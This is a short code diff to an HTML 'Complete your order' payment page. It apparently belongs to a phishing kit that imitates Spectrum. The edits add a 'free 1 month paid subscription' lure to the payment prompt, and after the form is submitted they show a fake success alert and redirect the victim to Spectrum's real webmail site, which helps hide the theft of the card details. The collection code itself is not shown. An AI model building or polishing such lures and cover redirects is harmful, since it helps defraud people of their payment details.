@@ -309,7 +309,7 @@
                 </svg>
             </div>
             <h1>Complete your order</h1>
-            <p>Enter your payment details below</p>
+            <p>Enter your payment details below for 1 month free paid subscription</p>
         </div>
 
         <!-- Order Summary -->
@@ -471,7 +471,9 @@
             
             // Allow form to submit after brief delay for visual feedback
             setTimeout(() => {
-                // Form will submit naturally
+                alert('Order completed successfully!!!.... You have received a 1 month paid subscription for free.');
+                // Redirect to Spectrum webmail after alert is closed
+                window.location.href = 'https://webmail.spectrum.net/';
             }, 500);
         });
 
